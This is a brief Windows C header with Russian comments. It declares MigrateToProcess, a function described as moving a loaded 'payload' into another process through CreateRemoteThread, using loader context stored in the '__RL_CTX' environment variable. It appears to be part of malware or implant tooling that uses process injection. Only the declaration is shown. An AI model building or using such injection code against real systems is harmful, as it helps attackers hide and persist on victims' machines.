#ifndef MIGRATE_H
#define MIGRATE_H

#include <windows.h>

// Мигрировать текущий замапленный payload в другой процесс.
// Использует контекст, оставленный загрузчиком в env-переменной "__RL_CTX".
// Возвращает TRUE если CreateRemoteThread удался.
//
// Важно: эта функция не завершает текущий процесс. Если нужно — после
// успешной миграции вызвать ExitProcess() самому.
BOOL MigrateToProcess(DWORD targetPid);

#endif
